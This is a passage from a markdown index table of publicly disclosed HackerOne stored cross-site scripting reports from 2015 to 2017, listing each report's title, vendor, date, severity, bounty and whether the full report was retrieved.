| STOR-055 | [Persistent XSS in image title](https://hackerone.com/reports/95564) | Imgur | 2015-10-24T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-056 | [Stored XSS in Slack (weird, trial and error)](https://hackerone.com/reports/96337) | Slack | 2015-10-28T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-057 | [Persistent XSS in https://p.imgur.com/albumview.gif and http://p.imgur.com/imageview.gif / post statistics](https://hackerone.com/reports/96467) | Imgur | 2015-10-29T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-058 | [Stored XSS on https://www.algolia.com/realtime-search-demo/*](https://hackerone.com/reports/98012) | Algolia | 2015-11-05T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-059 | [Stored-XSS in https://www.coinbase.com/](https://hackerone.com/reports/100829) | Coinbase | 2015-11-21T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-060 | [Stored XSS in name selection](https://hackerone.com/reports/102755) | Algolia | 2015-12-01T00:00:00 | Not disclosed in the source | $100 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-061 | [Stored XSS](https://hackerone.com/reports/112025) | Udemy | 2016-01-21T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-062 | [owncloud.com: Persistent XSS In Account Profile](https://hackerone.com/reports/116254) | ownCloud | 2016-02-13T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-063 | [Markdown based stored XSS (IE only)](https://hackerone.com/reports/118024) | GitLab | 2016-02-22T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-064 | [Stored XSS](https://hackerone.com/reports/118950) | Veris | 2016-02-26T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-065 | [Tweet Deck XSS- Persistent- Group DM name](https://hackerone.com/reports/119022) | Twitter | 2016-02-26T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-066 | [Multiple Stored XSS](https://hackerone.com/reports/120324) | Veris | 2016-03-03T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-067 | [Multiple Stored XSS on Sanbox.veris.in through Veris Frontdesk Android App](https://hackerone.com/reports/121275) | Veris | 2016-03-08T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-068 | [Stored XSS in https://checkout.shopify.com/](https://hackerone.com/reports/122849) | Shopify | 2016-03-13T00:00:00 | Not disclosed in the source | $500 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-069 | [Persistent XSS on Reservation / Booking Page](https://hackerone.com/reports/123005) | Zomato | 2016-03-14T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-070 | [Stored XSS in Access Rules](https://hackerone.com/reports/123905) | Veris | 2016-03-17T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-071 | [Stored XSS via "Free Shipping" option (Discounts)](https://hackerone.com/reports/124429) | Shopify | 2016-03-19T00:00:00 | Not disclosed in the source | $500 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-072 | [Stored Cross Site Scripting [SELF] in partners.uber.com](https://hackerone.com/reports/125503) | Uber | 2016-03-23T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-073 | [Stored XSS in archive.uber.com Due to Injection of Javascript:alert(0)](https://hackerone.com/reports/126906) | Uber | 2016-03-30T00:00:00 | Not disclosed in the source | $3,000 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-074 | [Stored XSS on newsroom.uber.com admin panel / Stream WordPress plugin](https://hackerone.com/reports/127948) | Uber | 2016-04-03T00:00:00 | Not disclosed in the source | $5,000 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-075 | [Stored XSS in member book](https://hackerone.com/reports/129342) | Veris | 2016-04-08T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-076 | [Persistent XSS on public project page](https://hackerone.com/reports/129736) | GitLab | 2016-04-11T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-077 | [Stored XSS in Financial Account executing in Bank tab](https://hackerone.com/reports/131038) | Moneybird | 2016-04-15T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-078 | [Stored XSS on team.slack.com using new Markdown editor of posts inside the Editing mode and using javascript-URIs](https://hackerone.com/reports/132104) | Slack | 2016-04-18T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-079 | [Persistent XSS on public wiki pages](https://hackerone.com/reports/136333) | GitLab | 2016-05-05T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-080 | [STORED XSS FOUND](https://hackerone.com/reports/136396) | ThisData | 2016-05-05T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-081 | [[Stored XSS] sandbox.veris.in](https://hackerone.com/reports/137127) | Veris | 2016-05-08T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-082 | [Stored XSS on 'Badges' page](https://hackerone.com/reports/137845) | Veris | 2016-05-11T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-083 | [Stored XSS in Filters](https://hackerone.com/reports/141114) | Pushwoosh | 2016-05-26T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-084 | [Template stored XSS](https://hackerone.com/reports/141198) | drchrono | 2016-05-26T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-085 | [Stored XSS in unifi.ubnt.com](https://hackerone.com/reports/142084) | Ubiquiti Networks | 2016-05-30T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-086 | [Cross-Site Scripting Stored On Rich Media](https://hackerone.com/reports/142540) | Pushwoosh | 2016-06-01T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-087 | [[STORED XSS] in debtor reports of ,,invoices''](https://hackerone.com/reports/142893) | Moneybird | 2016-06-03T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-088 | [Stored XSS in SupportFlow Ticket Subject](https://hackerone.com/reports/145086) | Ian Dunn | 2016-06-16T00:00:00 | Not disclosed in the source | $50 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-089 | [Stored XSS from ticket messages in admin table in SupportFlow](https://hackerone.com/reports/145091) | Ian Dunn | 2016-06-16T00:00:00 | Not disclosed in the source | $50 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-090 | [Stored Cross site scripting](https://hackerone.com/reports/145246) | Zomato | 2016-06-16T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-091 | [Stored XSS on Share-popup of a directory's Gallery-view](https://hackerone.com/reports/145355) | Nextcloud | 2016-06-17T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-092 | [Full Page Caching Stored XSS Vulnerability](https://hackerone.com/reports/148300) | concrete5 | 2016-06-29T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-093 | [Stored XSS in comments](https://hackerone.com/reports/148751) | Paragon Initiative Enterprises | 2016-07-01T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-094 | ["a stored xss issue in share post menu"](https://hackerone.com/reports/148848) | Slack | 2016-07-02T00:00:00 | Not disclosed in the source | $500 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-095 | [[Thirdparty] Stored XSS in chat module - nextcloud server 9.0.51 installed in ubuntu 14.0.4 LTS](https://hackerone.com/reports/148897) | Nextcloud | 2016-07-02T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-096 | [a stored xss issue in https://files.slack.com](https://hackerone.com/reports/149011) | Slack | 2016-07-03T00:00:00 | Not disclosed in the source | $500 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-097 | [Stored xss](https://hackerone.com/reports/149154) | Algolia | 2016-07-04T00:00:00 | Not disclosed in the source | $100 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-098 | [Stored XSS in wis.pr](https://hackerone.com/reports/149571) | Whisper | 2016-07-06T00:00:00 | Not disclosed in the source | $100 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-099 | [[bbPress] Stored XSS in any forum post.](https://hackerone.com/reports/151117) | Automattic | 2016-07-13T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-100 | [Stored XSS triggered by json key during UI generation](https://hackerone.com/reports/156347) | Algolia | 2016-08-03T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-101 | [Stored xss](https://hackerone.com/reports/156373) | Algolia | 2016-08-03T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-102 | [Stored XSS from Display Settings triggered on Save and viewing realtime search demo](https://hackerone.com/reports/156387) | Algolia | 2016-08-03T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-103 | [XSS on IOS app via HTML rendering](https://hackerone.com/reports/157434) | Nextcloud | 2016-08-07T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Stored | Not disclosed in the source | Partial report (official disclosure summary only) | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-104 | [Stored XSS](https://hackerone.com/reports/157958) | Instacart | 2016-08-09T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-105 | [Stored XSS(Cross Site Scripting) In Slack App Name](https://hackerone.com/reports/159460) | Slack | 2016-08-15T00:00:00 | Not disclosed in the source | $1,000 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-106 | [[render.bitstrips.com] Stored XSS via an incorrect avatar property value](https://hackerone.com/reports/159878) | Snapchat | 2016-08-16T00:00:00 | Not disclosed in the source | $400 | Cross-site Scripting (XSS) - Generic | www.bitstrips.com | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-107 | [Unauthenticated Stored xss](https://hackerone.com/reports/168054) | Nextcloud | 2016-09-13T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-108 | [Stored XSS in albums on http://m.imgur.com/](https://hackerone.com/reports/169751) | Imgur | 2016-09-16T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-109 | [[kb.informatica.com] Stored XSS](https://hackerone.com/reports/170369) | Informatica | 2016-09-19T00:00:00 | high | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-110 | [Stored XSS on Admin Access Page - Email field](https://hackerone.com/reports/173501) | Revive Adserver | 2016-10-02T00:00:00 | high | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-111 | [Public profile is vulnerable to stored XSS / Facebook Token can be stolen](https://hackerone.com/reports/175122) | DigitalSellz | 2016-10-11T00:00:00 | high | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-112 | [Stored XSS in community.ubnt.com](https://hackerone.com/reports/179164) | Ubiquiti Networks | 2016-10-31T00:00:00 | high | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-113 | [Stored XSS в личных сообщениях](https://hackerone.com/reports/181823) | VK.com | 2016-11-12T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-114 | [Stored xss in ALBUM DESCRIPTION](https://hackerone.com/reports/181955) | Imgur | 2016-11-13T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-115 | [Stored cross-site scripting (XSS) on a DoD website](https://hackerone.com/reports/183971) | U.S. Dept Of Defense | 2016-11-21T00:00:00 | high | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-116 | [Stored cross site scripting (XSS) vulnerability on a DoD website](https://hackerone.com/reports/184901) | U.S. Dept Of Defense | 2016-11-24T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-117 | [Stored xss](https://hackerone.com/reports/187380) | ownCloud | 2016-12-01T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-118 | [Persistent XSS vulnerability on a DoD website](https://hackerone.com/reports/187759) | U.S. Dept Of Defense | 2016-12-02T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-119 | [Persistent XSS in www.starbucks.com](https://hackerone.com/reports/188972) | Starbucks | 2016-12-06T00:00:00 | high | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-120 | [Unauthenticated Stored XSS on <any>.myshopify.com via checkout page](https://hackerone.com/reports/189378) | Shopify | 2016-12-08T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-121 | [[marketplace.informatica.com] Profile stored XSS](https://hackerone.com/reports/190217) | Informatica | 2016-12-10T00:00:00 | high | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-122 | [Stored XSS on new Calling plugin (spreed)](https://hackerone.com/reports/190870) | Nextcloud | 2016-12-13T00:00:00 | high | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-123 | [Stored XSS in blog comments through Shopify API](https://hackerone.com/reports/192210) | Shopify | 2016-12-18T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-124 | [Stored XSS at https://finance.owox.com/customer/accountList](https://hackerone.com/reports/192922) | OWOX, Inc. | 2016-12-21T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-125 | [WordPress <= 4.6.1 Stored XSS Via Theme File](https://hackerone.com/reports/197878) | Nextcloud | 2017-01-12T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-126 | [Stored XSS in topics because of whitelisted_generic engine vulnerability](https://hackerone.com/reports/197902) | Discourse | 2017-01-12T00:00:00 | high | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-127 | [Stored XSS in posts because of absence of oembed variables values escaping](https://hackerone.com/reports/197914) | Discourse | 2017-01-12T00:00:00 | high | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-128 | [Stored XSS vulnerability on a DoD website](https://hackerone.com/reports/202496) | U.S. Dept Of Defense | 2017-02-01T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-129 | [[marketplace.informatica.com]- Stored XSS on Image title and Edit Property](https://hackerone.com/reports/202951) | Informatica | 2017-02-02T00:00:00 | high | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-130 | [Stored XSS via Discussion Title and Send as Email attribute in [marketplace.informatica.com]](https://hackerone.com/reports/203912) | Informatica | 2017-02-06T00:00:00 | high | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-131 | [Stored Cross Site Scripting in Customer Name](https://hackerone.com/reports/211643) | Moneybird | 2017-03-08T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-132 | [Stored XSS in [shop].myshopify.com/admin/orders/[id]](https://hackerone.com/reports/214044) | Shopify | 2017-03-17T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-133 | [Stored XSS in comments on https://www.starbucks.co.uk/blog/*](https://hackerone.com/reports/218226) | Starbucks | 2017-04-02T00:00:00 | high | Not disclosed in the source | Cross-site Scripting (XSS) - Stored | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-134 | [Stored XSS on Files overview by abusing git submodule URL](https://hackerone.com/reports/218872) | GitLab | 2017-04-05T00:00:00 | high | Not disclosed in the source | Cross-site Scripting (XSS) - Stored | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-135 | [Stored XSS in RSS Feeds Title (Concrete5 v8.1.0)](https://hackerone.com/reports/221380) | concrete5 | 2017-04-16T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Stored | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-136 | [Stored but [SELF] XSS in mercantile.wordpress.org](https://hackerone.com/reports/222224) | WordPress | 2017-04-19T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Stored | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-137 | [Stored XSS in Gallery application (NC-SA-2017-010)](https://hackerone.com/reports/222838) | Nextcloud | 2017-04-21T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-138 | [[demo.weblate.org] Stored Self-XSS via Editor Link in Profile](https://hackerone.com/reports/223331) | Weblate | 2017-04-24T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Stored | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-139 | [Stored XSS in Pages SEO dialog Name field (concrete5 8.1.0)](https://hackerone.com/reports/230029) | concrete5 | 2017-05-19T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Stored | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-140 | [Stored self-XSS in mercantile.wordpress.org checkout](https://hackerone.com/reports/230232) | WordPress | 2017-05-20T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Stored | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-141 | [Stored XSS in Headline TextControl element in Express forms [ concrete5 8.1.0 ]](https://hackerone.com/reports/230278) | concrete5 | 2017-05-20T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Stored | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-142 | [Stored XSS in snapmatic comments](https://hackerone.com/reports/231389) | Rockstar Games | 2017-05-24T00:00:00 | medium | $1,000 | Cross-site Scripting (XSS) - Stored | socialclub.rockstargames.com | Partial report (official disclosure summary only) | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-143 | [Stored XSS in profile activity feed messages](https://hackerone.com/reports/231444) | Rockstar Games | 2017-05-24T00:00:00 | medium | $1,000 | Cross-site Scripting (XSS) - Stored | socialclub.rockstargames.com | Partial report (official disclosure summary only) | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-144 | [XSS on $shop$.myshopify.com/admin/ and partners.shopify.com via whitelist bypass in SVG icon for sales channel applications](https://hackerone.com/reports/232174) | Shopify | 2017-05-26T00:00:00 | high | $5,000 | Cross-site Scripting (XSS) - Stored | partners.shopify.com | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-145 | [[compose.mixmax.com] Stored XSS on compose.mixmax.com in contact names.](https://hackerone.com/reports/235292) | Mixmax | 2017-06-01T00:00:00 | high | Not disclosed in the source | Cross-site Scripting (XSS) - Stored | Not disclosed in the source | Partial report (official disclosure summary only) | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-146 | [[app.mixmax.com] Stored XSS on Adding new enhancement.](https://hackerone.com/reports/237100) | Mixmax | 2017-06-06T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Stored | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-147 | [Stored XSS in Templates>Enahance>Social Badges](https://hackerone.com/reports/238906) | Mixmax | 2017-06-11T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Stored | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-148 | [Stored XSS in *.myshopify.com](https://hackerone.com/reports/241008) | Shopify | 2017-06-17T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Stored | your-store.myshopify.com | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-149 | [Improper parsing of input could lead to future XSS vulnerabilities in Sequences](https://hackerone.com/reports/243138) | Mixmax | 2017-06-26T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Stored | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-150 | [Double Stored Cross-Site scripting in the admin panel](https://hackerone.com/reports/245172) | TTS Bug Bounty | 2017-07-01T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Stored | https://github.com/18f/federalist | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-151 | [Stored XSS in Private Messages 'Reply' allows to execute malicious JavaScript against any user while replying to the message which contains payload](https://hackerone.com/reports/247517) | concrete5 | 2017-07-09T00:00:00 | high | Not disclosed in the source | Cross-site Scripting (XSS) - Stored | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-152 | [Stored XSS in Name field in User Groups/Group Details form](https://hackerone.com/reports/247521) | concrete5 | 2017-07-09T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Stored | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-153 | [Stored XSS vulnerability in RSS Feeds Description field](https://hackerone.com/reports/248133) | concrete5 | 2017-07-11T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Stored | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-154 | [Stored XSS at Moneybird](https://hackerone.com/reports/251043) | Moneybird | 2017-07-18T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Stored | Not disclosed in the source | Partial report (official disclosure summary only) | [Stored-XSS.md](../../Stored-XSS.md) |

<details><summary>Retrieval limitations for this group</summary>

- STOR-044 (https://hackerone.com/reports/53730): Partial report (official disclosure summary only).
- STOR-050 (https://hackerone.com/reports/78260): Partial report (official disclosure summary only).
- STOR-057 (https://hackerone.com/reports/96467): Partial report (official disclosure summary only).
- STOR-059 (https://hackerone.com/reports/100829): Partial report (official disclosure summary only).
- STOR-070 (https://hackerone.com/reports/123905): Partial report (official disclosure summary only).
- STOR-075 (https://hackerone.com/reports/129342): Partial report (official disclosure summary only).
- STOR-077 (https://hackerone.com/reports/131038): Partial report (official disclosure summary only).
- STOR-080 (https://hackerone.com/reports/136396): Partial report (official disclosure summary only).
- STOR-082 (https://hackerone.com/reports/137845): Partial report (official disclosure summary only).
- STOR-083 (https://hackerone.com/reports/141114): Partial report (official disclosure summary only).
- STOR-087 (https://hackerone.com/reports/142893): Partial report (official disclosure summary only).
- STOR-103 (https://hackerone.com/reports/157434): Partial report (official disclosure summary only).
- STOR-108 (https://hackerone.com/reports/169751): Partial report (official disclosure summary only).
